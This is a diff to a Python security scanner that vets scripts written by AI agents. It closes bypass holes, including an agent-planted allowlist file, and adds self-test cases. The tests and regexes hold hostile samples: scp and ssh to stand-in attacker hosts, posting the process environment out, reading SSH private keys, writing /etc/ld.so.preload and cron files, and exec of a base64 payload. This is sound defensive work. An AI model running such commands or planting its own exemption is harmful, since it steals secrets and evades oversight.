@@ -60,8 +60,12 @@ WARN class (recorded; may proceed only with a logged justification):
 
 Allowlist
 ---------
---allow FILE, or `security_allowlist.txt` next to the scanned script if
-present (--allow wins). One entry per line, `#` comments allowed:
+--allow FILE only. There is deliberately NO auto-discovery of
+`security_allowlist.txt` next to the scanned script: the scanned directory
+is agent-authored workspace, so auto-loading it would let an agent write its
+own SEC-003 exemption and bypass the BLOCKED class. Allowlists enter only
+through the explicit --allow flag (issued by the pipeline/operator, not by
+the agent). One entry per line, `#` comments allowed:
     host:example.com     exempts example.com and *.example.com from SEC-003
     pattern:<regex>      exempts WARN-class findings whose source line
                          matches <regex> — BLOCKED findings can NEVER be
@@ -135,6 +139,17 @@ CRED_RE = re.compile(
     r"|\.pem\b"
 )
 
+# Like CRED_RE but without requiring the ~/$HOME/home-dir prefix: applied to
+# paths assembled from parts, where the home prefix may live in a
+# non-constant operand (Path.home(), expanduser("~"), a variable base dir)
+# while the marker itself ("~/.ssh", "id_rsa", ".pem", ...) is constant.
+CRED_SEGMENT_RE = re.compile(
+    r"(?:^|/)\.(?:ssh|aws|netrc)(?:/|$)"
+    r"|\.config/gcloud"
+    r"|\bid_(?:rsa|dsa|ecdsa|ed25519)\b"
+    r"|\.pem\b"
+)
+
 MKFS_RE = re.compile(r"\bmkfs\b")
 DD_RE = re.compile(r"\bdd\b(?=[^|;&]*\bof=/dev/)")
 CHMOD_ROOT_RE = re.compile(r"\bchmod\s+(?:-[A-Za-z]+\s+)*777\s+/(?=[\s;|&)]|$)")
@@ -164,7 +179,9 @@ CURL_WGET_RE = re.compile(r"\b(?:curl|wget)\b")
 URL_RE = re.compile(r"https?://[^\s\"'`<>)]+")
 SSH_AT_RE = re.compile(r"\bssh\s+(?:-[A-Za-z0-9]+\s+)*[A-Za-z0-9._-]+@([A-Za-z0-9._-]+)")
 SSH_HOST_RE = re.compile(r"\bssh\s+(?:-[A-Za-z0-9]+\s+)*([A-Za-z0-9_-]+(?:\.[A-Za-z0-9_-]+)+)")
-SCP_RE = re.compile(r"\bscp\s+(?:-[A-Za-z0-9]+\s+)*[^\s|;&]*?(?:[A-Za-z0-9._-]+@)?([A-Za-z0-9._-]+):[A-Za-z0-9._/~*-]")
+# (?:[^\s|;&]*\s+)*? lets the remote spec appear after any number of local
+# path tokens (`scp LOCAL REMOTE`), not only as the first operand.
+SCP_RE = re.compile(r"\bscp\s+(?:-[A-Za-z0-9]+\s+)*(?:[^\s|;&]*\s+)*?(?:[A-Za-z0-9._-]+@)?([A-Za-z0-9._-]+):[A-Za-z0-9._/~*-]")
 NC_RE = re.compile(r"\b(?:nc|ncat|netcat)\s+(?:-[A-Za-z0-9]+\s+)*([A-Za-z0-9._-]+)\s+\d{1,5}\b")
 
 
@@ -184,6 +201,24 @@ def host_allowed(host: str | None, hosts: list[str]) -> bool:
         if h == entry or h.endswith("." + entry):
             return True
     return False
+
+
+def egress_hosts_in_command(line: str) -> list[str | None]:
+    """Egress hosts mentioned on a shell command line (or an argv joined into
+    one). A None entry means "egress tool present, target unresolvable" and
+    fails closed. Empty list if no egress tool is recognized."""
+    hosts: list[str | None] = []
+    if CURL_WGET_RE.search(line):
+        urls = URL_RE.findall(line)
+        if urls:
+            hosts.extend(host_of_url(u) for u in urls)
+        else:
+            hosts.append(None)  # unresolvable target -> fail closed
+    for rx in (SSH_AT_RE, SSH_HOST_RE, SCP_RE, NC_RE):
+        m = rx.search(line)
+        if m:
+            hosts.append(m.group(1))
+    return hosts
 
 
 def scan_line_regex(line: str, lineno: int, add, hosts: list[str]) -> None:
@@ -224,17 +259,7 @@ def scan_line_regex(line: str, lineno: int, add, hosts: list[str]) -> None:
         add(WARN, lineno, "SEC-106")
 
     # Outbound egress via shell tools (SEC-003 + SEC-107 record).
-    egress_hosts: list[str | None] = []
-    if CURL_WGET_RE.search(line):
-        urls = URL_RE.findall(line)
-        if urls:
-            egress_hosts.extend(host_of_url(u) for u in urls)
-        else:
-            egress_hosts.append(None)  # unresolvable target -> fail closed
-    for rx in (SSH_AT_RE, SSH_HOST_RE, SCP_RE, NC_RE):
-        m = rx.search(line)
-        if m:
-            egress_hosts.append(m.group(1))
+    egress_hosts = egress_hosts_in_command(line)
     if egress_hosts:
         add(WARN, lineno, "SEC-107")
         if not any(host_allowed(h, hosts) for h in egress_hosts):
@@ -255,6 +280,22 @@ NET_FUNCS = {
     "socket.create_connection",
 }
 
+# Tools whose argv element 0 in a subprocess list/tuple literal marks the
+# call as network egress (SEC-003/SEC-107 + SEC-002 env-exfil checking).
+EGRESS_TOOLS = {"curl", "wget", "scp", "ssh", "nc", "ncat", "netcat"}
+
+PATH_CTOR_NAMES = {
+    "Path", "pathlib.Path",
+    "PurePath", "pathlib.PurePath",
+    "PosixPath", "pathlib.PosixPath",
+    "WindowsPath", "pathlib.WindowsPath",
+}
+
+SHUTIL_ETC_FUNCS = {
+    "shutil.copy", "shutil.copy2", "shutil.copyfile",
+    "shutil.copytree", "shutil.move",
+}
+
 
 class PyAnalyzer:
     """Walks the AST: tracks module aliases, light taint propagation
@@ -270,6 +311,9 @@ class PyAnalyzer:
         self.name_aliases: dict[str, str] = {}   # local name -> dotted object
         self.socket_objs: set[str] = set()       # vars holding socket objects
         self.session_objs: set[str] = set()      # vars holding requests.Session
+        self.etc_path_objs: set[str] = set()     # vars holding Path values
+                                                 # whose constant parts
+                                                 # target /etc
         self.env_taint: set[str] = set()
         self.net_taint: set[str] = set()
         self.b64_taint: set[str] = set()
@@ -295,6 +339,86 @@ class PyAnalyzer:
             return ".".join(reversed(parts))
         return None
 
+    # -- constant folding -----------------------------------------------------
+
+    def fold_str(self, node) -> str | None:
+        """Constant-fold a string expression: Str constants, Add chains of
+        string constants (recursively), and f-strings whose parts are all
+        constants. None when any part is non-constant."""
+        if isinstance(node, ast.Constant) and isinstance(node.value, str):
+            return node.value
+        if isinstance(node, ast.BinOp) and isinstance(node.op, ast.Add):
+            left = self.fold_str(node.left)
+            right = self.fold_str(node.right)
+            if left is not None and right is not None:
+                return left + right
+        if isinstance(node, ast.JoinedStr):
+            parts: list[str] = []
+            for p in node.values:
+                if isinstance(p, ast.Constant) and isinstance(p.value, str):
+                    parts.append(p.value)
+                else:
+                    return None
+            return "".join(parts)
+        return None
+
+    def fold_path(self, node) -> str | None:
+        """Constant-fold a path-shaped expression: fold_str plus
+        os.path.expanduser/join, Path(...) constructors, and `/` chains of
+        fully-foldable operands. None when any part is non-constant."""
+        if node is None:
+            return None
+        s = self.fold_str(node)
+        if s is not None:
+            return s
+        if isinstance(node, ast.Call):
+            d = self.dotted(node.func)
+            if d in {"os.path.expanduser", "os.path.abspath",
+                     "os.path.normpath", "os.path.realpath"} and node.args:
+                return self.fold_path(node.args[0])
+            if d == "os.path.join" and node.args:
+                parts = [self.fold_path(a) for a in node.args]
+                if all(p is not None for p in parts):
+                    out = parts[0]
+                    for p in parts[1:]:
+                        if p.startswith("/"):  # os.path.join resets here
+                            out = p
+                        else:
+                            out = out.rstrip("/") + "/" + p
+                    return out
+            if d in PATH_CTOR_NAMES and node.args:
+                return self.fold_path(node.args[0])
+            return None
+        if isinstance(node, ast.BinOp) and isinstance(node.op, ast.Div):
+            parts = [self.fold_path(p) for p in self.div_chain(node)]
+            if all(p is not None for p in parts):
+                out = parts[0]
+                for p in parts[1:]:
+                    out = out.rstrip("/") + "/" + p.lstrip("/")
+                return out
+        return None
+
+    def div_chain(self, node) -> list:
+        """Flatten a `/` BinOp chain into its operands (left to right)."""
+        if isinstance(node, ast.BinOp) and isinstance(node.op, ast.Div):
+            return self.div_chain(node.left) + self.div_chain(node.right)
+        return [node]
+
+    def folded_str_parts(self, node) -> list[str]:
+        """All constant-folded string pieces anywhere inside `node` (walked).
+        Used for marker checks on paths assembled from parts, where no single
+        fold carries the whole path."""
+        out: list[str] = []
+        for sub in ast.walk(node):
+            s = self.fold_str(sub)
+            if s:
+                out.append(s)
+        return out
+
+    @staticmethod
+    def _is_etc(s: str) -> bool:
+        return s == "/etc" or "/etc/" in s
+
     # -- classification helpers ----------------------------------------------
 
     def is_env_expr(self, node) -> bool:
@@ -311,9 +435,42 @@ class PyAnalyzer:
                 return True
         return False
 
+    def env_in(self, node) -> bool:
+        """True if the subtree reads the process environment directly
+        (os.environ / os.environ[...] / os.getenv / dict(os.environ)) or
+        references an env-tainted name. Used for SEC-002: this check is
+        independent of any host allowlist."""
+        if node is None:
+            return False
+        for sub in ast.walk(node):
+            if self.is_env_expr(sub):
+                return True
+            if isinstance(sub, ast.Name) and sub.id in self.env_taint:
+                return True
+        return False
+
+    def is_socket_ctor(self, node) -> bool:
+        """True if `node` constructs a socket: socket.socket(...) /
+        socket.create_connection(...), through any aliasing of the module."""
+        return isinstance(node, ast.Call) and self.dotted(node.func) in {
+            "socket.socket", "socket.create_connection"}
+
     def is_b64_decode(self, node) -> bool:
         d = self.dotted(node)
-        return bool(d and d.split(".")[-1] in {"b64decode", "decodebytes"} and "base64" in d)
+        if d:
+            last = d.split(".")[-1]
+            if last in {"b64decode", "decodebytes"} and "base64" in d:
+                return True
+        if isinstance(node, ast.Call):
+            fd = self.dotted(node.func)
+            # codecs.decode(x, "base64") / codecs.decode(x, "base_64")
+            if fd == "codecs.decode" and len(node.args) >= 2:
+                enc = self.fold_str(node.args[1])
+                if enc:
+                    norm = enc.lower().replace("-", "").replace("_", "")
+                    if norm == "base64":
+                        return True
+        return False
 
     def is_net_result(self, node) -> bool:
         d = self.dotted(node)
@@ -403,15 +560,26 @@ class PyAnalyzer:
             if not isinstance(node, (ast.Assign, ast.AnnAssign)):
                 continue
             value = getattr(node, "value", None)
-            if not isinstance(value, ast.Call):
+            if value is None:
                 continue
-            d = self.dotted(value.func)
             targets = node.targets if isinstance(node, ast.Assign) else [node.target]
             names = self._target_names(targets)
-            if d == "socket.socket" or d == "socket.create_connection":
-                self.socket_objs |= names
-            elif d == "requests.Session":
-                self.session_objs |= names
+            if isinstance(value, ast.Call):
+                d = self.dotted(value.func)
+                if d == "socket.socket" or d == "socket.create_connection":
+                    self.socket_objs |= names
+                elif d == "requests.Session":
+                    self.session_objs |= names
+            if self.is_etc_path_expr(value):
+                self.etc_path_objs |= names
+
+    def is_etc_path_expr(self, node) -> bool:
+        """True if the expression is a Path-shaped value whose constant parts
+        target /etc (Path("/etc") / "x", Path("/etc/passwd"), join chains)."""
+        s = self.fold_path(node)
+        if s and self._is_etc(s):
+            return True
+        return any(self._is_etc(p) for p in self.folded_str_parts(node))
 
     def compute_taint(self) -> None:
         assigns = sorted(
@@ -471,20 +639,24 @@ class PyAnalyzer:
         self.add(WARN, node.lineno, "SEC-107")
         if not host_allowed(host, self.hosts):
             self.add(BLOCKED, node.lineno, "SEC-003")
+        # SEC-002 is independent of the host allowlist: allowlisted hosts
+        # never exonerate exfiltration dataflow.
         for a in itertools.chain(node.args, (kw.value for kw in node.keywords)):
-            if self.mentions(a, self.env_taint):
+            if self.env_in(a):
                 self.add(BLOCKED, node.lineno, "SEC-002")
                 break
 
     def shell_string_exfil(self, node: ast.Call) -> None:
+        """SEC-002 for the shell-string command form (os.system, subprocess
+        string argv): env content flowing into a command line that mentions
+        an egress tool. fold_str catches Add-chain assembly."""
         if not node.args:
             return
         a0 = node.args[0]
-        text = self.static_str(a0)
+        hay = (self.static_str(a0) or "") + " " + (self.fold_str(a0) or "")
         if (
-            text
-            and re.search(r"\b(?:curl|wget|nc|ncat|netcat|scp|ssh)\b", text)
-            and self.mentions(a0, self.env_taint)
+            re.search(r"\b(?:curl|wget|nc|ncat|netcat|scp|ssh)\b", hay)
+            and self.env_in(a0)
         ):
             self.add(BLOCKED, node.lineno, "SEC-002")
 
@@ -492,19 +664,129 @@ class PyAnalyzer:
         if not node.args:
             return
         p = node.args[0]
-        if not (isinstance(p, ast.Constant) and isinstance(p.value, str)):
+        path = self.fold_path(p)
+        if path is None:
             return
-        path = p.value
-        if CRED_RE.search(path):
+        if CRED_RE.search(path) or CRED_SEGMENT_RE.search(path):
             self.add(BLOCKED, node.lineno, "SEC-001")
+        else:
+            # markers may be visible only inside individual folded parts
+            for part in self.folded_str_parts(p):
+                if CRED_SEGMENT_RE.search(part):
+                    self.add(BLOCKED, node.lineno, "SEC-001")
+                    break
         mode = ""
         if len(node.args) >= 2 and isinstance(node.args[1], ast.Constant):
             mode = str(node.args[1].value)
         for kw in node.keywords:
             if kw.arg == "mode" and isinstance(kw.value, ast.Constant):
                 mode = str(kw.value.value)
-        if path.startswith("/etc/") and any(c in mode for c in "wax+"):
+        if self._is_etc(path) and any(c in mode for c in "wax+"):
             self.add(BLOCKED, node.lineno, "SEC-008")
+
+    def check_os_open(self, node: ast.Call) -> None:
+        """SEC-008 for os.open of /etc paths (flags like O_WRONLY|O_CREAT are
+        the write vector); SEC-001 for credential paths, folded."""
+        if not node.args:
+            return
+        s = self.fold_path(node.args[0])
+        if not s:
+            return
+        if CRED_RE.search(s) or CRED_SEGMENT_RE.search(s):
+            self.add(BLOCKED, node.lineno, "SEC-001")
+        if self._is_etc(s):
+            self.add(BLOCKED, node.lineno, "SEC-008")
+
+    def check_shutil(self, node: ast.Call) -> None:
+        """SEC-008 for shutil copy/move family with any constant argument
+        under /etc."""
+        for a in node.args:
+            cands = [self.fold_path(a)] + self.folded_str_parts(a)
+            if any(s and self._is_etc(s) for s in cands):
+                self.add(BLOCKED, node.lineno, "SEC-008")
+                return
+
+    def check_path_ctor(self, node: ast.Call) -> None:
+        """SEC-001/SEC-008 for Path(...) constructor arguments, folded."""
+        s = self.fold_path(node)
+        if s:
+            if CRED_RE.search(s) or CRED_SEGMENT_RE.search(s):
+                self.add(BLOCKED, node.lineno, "SEC-001")
+            if self._is_etc(s):
+                self.add(BLOCKED, node.lineno, "SEC-008")
+        for part in self.folded_str_parts(node):
+            if CRED_SEGMENT_RE.search(part):
+                self.add(BLOCKED, node.lineno, "SEC-001")
+            if self._is_etc(part):
+                self.add(BLOCKED, node.lineno, "SEC-008")
+
+    def path_write_hits_etc(self, node: ast.Call, func: ast.Attribute) -> bool:
+        """SEC-008 predicate for Path-method writes: .write_text/.write_bytes/
+        .open("w")/.unlink/.rename on a value (inline or tracked variable)
+        whose constant parts target /etc."""
+        if func.attr == "open":
+            mode = ""
+            if node.args:
+                mode = self.fold_str(node.args[0]) or ""
+            for kw in node.keywords:
+                if kw.arg == "mode":
+                    mode = self.fold_str(kw.value) or mode
+            if not any(c in mode for c in "wax+"):
+                return False
+        recv = func.value
+        if isinstance(recv, ast.Name) and recv.id in self.etc_path_objs:
+            return True
+        s = self.fold_path(recv)
+        if s and self._is_etc(s):
+            return True
+        return any(self._is_etc(part) for part in self.folded_str_parts(recv))
+
+    def check_div_chain(self, node: ast.BinOp) -> None:
+        """`/` on path values (Path(...) / "seg" / ...): credential markers
+        or /etc targets among the constant operands (assembled paths)."""
+        for part in self.div_chain(node):
+            s = self.fold_path(part)
+            if not s:
+                continue
+            if CRED_SEGMENT_RE.search(s):
+                self.add(BLOCKED, node.lineno, "SEC-001")
+            if self._is_etc(s):
+                self.add(BLOCKED, node.lineno, "SEC-008")
+
+    # subprocess argv: execution-control keywords are not exfil arguments
+    PROC_META_KEYWORDS = {"shell", "cwd", "env", "timeout", "check",
+                          "capture_output", "text", "encoding", "errors",
+                          "bufsize", "close_fds", "preexec_fn",
+                          "start_new_session", "executable", "pass_fds"}
+
+    def check_subprocess(self, node: ast.Call) -> None:
+        """SEC-003/SEC-107/SEC-002 for subprocess.* with a literal list/tuple
+        argv whose element 0 is an egress tool (curl/wget/scp/ssh/nc/...)."""
+        argv = node.args[0] if node.args else None
+        if not isinstance(argv, (ast.List, ast.Tuple)) or not argv.elts:
+            return
+        parts = [self.fold_str(e) for e in argv.elts]
+        tool = parts[0].rsplit("/", 1)[-1] if parts[0] else None
+        if tool not in EGRESS_TOOLS:
+            return
+        # SEC-002: env content anywhere in the argv — never exonerated by a
+        # host allowlist.
+        if any(self.env_in(a) for a in node.args) or any(
+            kw.arg not in self.PROC_META_KEYWORDS and self.env_in(kw.value)
+            for kw in node.keywords
+        ):
+            self.add(BLOCKED, node.lineno, "SEC-002")
+        # Remaining literal elements form the command line for host
+        # extraction; non-constant elements keep their position as a \x00
+        # placeholder (never matches a host/URL pattern).
+        cmdline = " ".join(p if p is not None else "\x00" for p in parts)
+        hosts = egress_hosts_in_command(cmdline)
+        if not hosts and any(p is None for p in parts[1:]):
+            hosts = [None]  # target may hide in a non-constant element
+        if hosts:
+            self.add(WARN, node.lineno, "SEC-107")
+            if not any(host_allowed(h, self.hosts) for h in hosts):
+                self.add(BLOCKED, node.lineno, "SEC-003")
 
     def analyze_call(self, node: ast.Call) -> None:
         func = node.func
@@ -516,19 +798,31 @@ class PyAnalyzer:
         if d in NET_FUNCS:
             self.flag_egress(node)
             return
+        if d == "os.open":
+            self.check_os_open(node)
+            return
+        if d in SHUTIL_ETC_FUNCS:
+            self.check_shutil(node)
+            return
+        if d in PATH_CTOR_NAMES:
+            self.check_path_ctor(node)
+            return
         if isinstance(func, ast.Attribute):
-            if func.attr == "connect" and isinstance(func.value, ast.Name) \
-                    and func.value.id in self.socket_objs:
+            # socket.connect: tracked receiver OR an inline socket
+            # constructor (socket.socket().connect(...))
+            if func.attr == "connect" and (
+                (isinstance(func.value, ast.Name) and func.value.id in self.socket_objs)
+                or self.is_socket_ctor(func.value)
+            ):
                 self.flag_egress(node)
                 return
             if func.attr in REQUESTS_METHODS and isinstance(func.value, ast.Name) \
                     and func.value.id in self.session_objs:
                 self.flag_egress(node)
                 return
-            if func.attr in {"write_text", "write_bytes"} and isinstance(func.value, ast.Call):
-                inner = func.value.args[0] if func.value.args else None
-                if isinstance(inner, ast.Constant) and isinstance(inner.value, str) \
-                        and inner.value.startswith("/etc/"):
+            if func.attr in {"write_text", "write_bytes", "unlink", "rename"} \
+                    or func.attr == "open":
+                if self.path_write_hits_etc(node, func):
                     self.add(BLOCKED, node.lineno, "SEC-008")
                 return
 
@@ -542,7 +836,8 @@ class PyAnalyzer:
                 for kw in node.keywords
             ):
                 self.add(WARN, node.lineno, "SEC-101")
-            self.shell_string_exfil(node)
+            self.shell_string_exfil(node)   # string argv form
+            self.check_subprocess(node)     # list/tuple argv form
             return
         if d in {"pickle.load", "pickle.loads", "pickle.Unpickler"}:
             self.add(WARN, node.lineno, "SEC-103")
@@ -571,6 +866,8 @@ class PyAnalyzer:
         for node in ast.walk(self.tree):
             if isinstance(node, ast.Call):
                 self.analyze_call(node)
+            elif isinstance(node, ast.BinOp) and isinstance(node.op, ast.Div):
+                self.check_div_chain(node)
 
 
 # --------------------------------------------------------------------------
@@ -644,13 +941,11 @@ def scan_file(path: Path, allow: Path | None) -> dict:
     suffix = path.suffix.lower()
     kind = "python" if suffix == ".py" else "shell"
 
-    allow_file = None
-    if allow is not None:
-        allow_file = allow
-    else:
-        candidate = path.parent / "security_allowlist.txt"
-        if candidate.is_file():
-            allow_file = candidate
+    # Allowlists enter ONLY via the explicit --allow flag. Deliberate no
+    # auto-discovery of `security_allowlist.txt` next to the scanned script:
+    # that directory is agent-authored workspace, and auto-loading it would
+    # let an agent write its own SEC-003 exemption (planted-allowlist hole).
+    allow_file = allow
 
     hosts: list[str] = []
     patterns: list[re.Pattern] = []
@@ -720,7 +1015,10 @@ def exit_code_for(verdict: str, strict: bool) -> int:
 
 SELF_TEST_CASES = [
     # (name, filename, source, allowlist lines, expected verdict,
-    #  rule_ids that must be present, rule_ids that must be absent)
+    #  rule_ids that must be present, rule_ids that must be absent,
+    #  [optional] pass_allowlist: write the allowlist file AND pass it to
+    #  the scanner (default True); False = plant the file next to the
+    #  script without passing it, to prove auto-discovery is gone)
     (
         "benign training script", "benign.py",
         "import os\n"
@@ -853,6 +1151,58 @@ SELF_TEST_CASES = [
         "s.connect((\"evil.example\", 4444))\n",
         [], BLOCKED, ["SEC-003", "SEC-107"], [],
     ),
+    # --- bypass-fix regression cases (adversarial review F1..F7) -----------
+    (
+        "F1: subprocess list-form egress (scp/ssh)", "list_egress.py",
+        "import subprocess\n"
+        "subprocess.run([\"scp\", \"results.tar.gz\", \"attacker.evil.example:/incoming/\"])\n"
+        "subprocess.run([\"ssh\", \"bot.evil.example\", \"whoami\"])\n",
+        [], BLOCKED, ["SEC-003", "SEC-107"], [],
+    ),
+    (
+        "F2: inline socket.socket().connect()", "inline_sock.py",
+        "import socket\n"
+        "socket.socket().connect((\"evil.example\", 4444))\n",
+        [], BLOCKED, ["SEC-003", "SEC-107"], [],
+    ),
+    (
+        "F3: inline env exfiltration NOT exonerated by host allowlist", "env_exfil.py",
+        "import os\n"
+        "import requests\n"
+        "requests.post(\"http://mirror.example/upload\", data=dict(os.environ))\n",
+        ["host:mirror.example"], BLOCKED, ["SEC-002", "SEC-107"], ["SEC-003"],
+    ),
+    (
+        "F4: credential path assembled from string parts", "cred_parts.py",
+        "import os\n"
+        "open(os.path.expanduser(\"~/.s\" + \"sh/id_\" + \"rsa\")).read()\n",
+        [], BLOCKED, ["SEC-001"], [],
+    ),
+    (
+        "F5: /etc write vectors (os.open / shutil / tracked Path)", "etc_write.py",
+        "import os\n"
+        "import shutil\n"
+        "from pathlib import Path\n"
+        "fd = os.open(\"/etc/ld.so.preload\", os.O_WRONLY | os.O_CREAT)\n"
+        "os.write(fd, b\"evil.so\\n\")\n"
+        "shutil.copy(\"payload.so\", \"/etc/cron.d/x\")\n"
+        "p = Path(\"/etc\") / \"profile.d\" / \"zz\"\n"
+        "p.write_text(\"evil\")\n",
+        [], BLOCKED, ["SEC-008"], [],
+    ),
+    (
+        "F6: exec of codecs.decode(..., \"base64\") payload", "codecs_b64.py",
+        "import codecs\n"
+        "blob = codecs.decode(\"cHJpbnQoJ2hlbGxvJyk=\", \"base64\")\n"
+        "exec(blob)\n",
+        [], BLOCKED, ["SEC-007"], [],
+    ),
+    (
+        "F7: planted security_allowlist.txt next to the script is IGNORED", "planted.py",
+        "import requests\n"
+        "requests.get(\"http://evil.example/payload\")\n",
+        ["host:evil.example"], BLOCKED, ["SEC-003", "SEC-107"], [], False,
+    ),
 ]
 
 
@@ -860,16 +1210,24 @@ def run_self_test() -> int:
     failures = 0
     with tempfile.TemporaryDirectory(prefix="security_scan_selftest_") as td:
         tdir = Path(td)
-        for idx, (name, fname, source, allow, want_verdict, want_present, want_absent) in \
-                enumerate(SELF_TEST_CASES):
+        for idx, case in enumerate(SELF_TEST_CASES):
+            name, fname, source, allow, want_verdict, want_present, want_absent = case[:7]
+            pass_allow = case[7] if len(case) > 7 else True
             case_dir = tdir / f"case_{idx:02d}"
             case_dir.mkdir()
             script = case_dir / fname
             script.write_text(source, encoding="utf-8")
+            allow_path = None
             if allow:
-                (case_dir / "security_allowlist.txt").write_text("\n".join(allow), encoding="utf-8")
+                allow_file = case_dir / "security_allowlist.txt"
+                allow_file.write_text("\n".join(allow), encoding="utf-8")
+                # allowlists are explicit only (no auto-discovery), so the
+                # self-test passes the file the same way --allow would —
+                # unless the case plants it on purpose (pass_allow False)
+                if pass_allow:
+                    allow_path = allow_file
             try:
-                rep = scan_file(script, allow=None)
+                rep = scan_file(script, allow=allow_path)
             except Exception as e:  # noqa: BLE001 — self-test must report, not crash
                 print(f"FAIL  {name}: scanner raised {type(e).__name__}: {e}")
                 failures += 1
@@ -911,7 +1269,8 @@ def main(argv: list[str] | None = None) -> int:
     ap.add_argument("--json", action="store_true", help="machine-readable report")
     ap.add_argument("--strict", action="store_true", help="WARN verdict exits 1 instead of 0")
     ap.add_argument("--allow", metavar="FILE",
-                    help="allowlist file (default: security_allowlist.txt next to the script)")
+                    help="allowlist file (explicit only; security_allowlist.txt "
+                         "next to the script is deliberately NOT auto-loaded)")
     ap.add_argument("--self-test", action="store_true",
                     help="run embedded good/bad sample cases and exit 0/1")
     args = ap.parse_args(argv)
